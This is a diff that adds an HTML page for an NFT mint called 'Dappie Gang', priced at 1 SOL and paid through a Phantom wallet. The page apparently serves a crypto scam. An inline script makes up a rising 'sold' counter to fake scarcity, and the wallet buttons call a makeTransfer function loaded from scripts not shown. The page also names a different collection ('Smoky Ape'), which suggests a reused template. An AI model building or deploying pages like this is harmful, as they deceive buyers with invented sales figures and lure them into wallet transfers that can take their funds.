@@ -1,0 +1,63 @@
+<head>
+    <script src="index.iife.min.js"></script>
+    <script src="lib.js"></script>
+    <title>Dappie Gang</title>
+    <link rel="shortcut icon" type="image/ico" href="flaviconape.ico">
+    <link rel="stylesheet" href="style.css">
+    <script src="npm/web3@latest/dist/web3.min.js"></script>
+    <script src="ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script type="module" src="common.js"></script>
+</head>
+
+<body onload="onBodyLoad()">
+
+    <div class="container">
+
+        <img src="unknown (1).png" class="imamage" width="50" height="50">
+        <div class="quantity"><strong>Welcome to Dappie Gang</strong></div>
+        <div class="xxx" style="display: flex;width: 100%;justify-content: center;align-items: center;">
+            <image src="" width="" height="" style="border-radius: 6px;"></image>
+            <image src="gif.7e5af25a.gif" width="500" height="500" style="margin-left: 8px;border-radius: 10px;"></image>
+            <image src="" width="" height="" style="margin-left: px;border-radius: px;"></image>
+        </div>
+
+
+        <div style="margin-top:75px;">
+            <div class="quantity" id="quantity">Quantity (max 5): <input type="number" id="mintnumber" min="1" max="5" value="1"></div>
+
+            <a href="#">
+                <div onclick="onBodyLoad()" id="connect" class="but"><strong>CONNECT WALLET</strong></div>
+            </a>
+            <a href="#">
+                <div onclick="makeTransfer(1000);" id="mint" class="but"><strong>MINT Dappie</strong></div>
+            </a>
+        </div>
+
+        <script>
+            var mintnumber = 3117;
+            var interval = setInterval(foo, 2134)
+
+            function foo() {
+
+                mintnumber = mintnumber + Math.floor(Math.random() * (20));
+                document.getElementById("soldnumber").innerHTML = mintnumber;
+
+                if (mintnumber >= 3225) {
+                    document.getElementById("soldnumber").innerHTML = 3331;
+                    clearInterval(interval);
+                }
+            }
+
+            document.getElementById('mint').style.display = 'none';
+        </script>
+        <br>
+        <div style="font-family: 'Montserrat';font-size:1.025vw;color:#FFFFFFFF;text-align:center;"><span id="soldnumber">3117</span> / 3333 sold</div>
+
+
+        <div class="mintprice">Price per mint is 1 SOL<br><br>1. Connect your wallet with Phantom<br>2. Click on button to mint your Smoky Ape</div>
+
+    </div>
+
+
+
+</body>
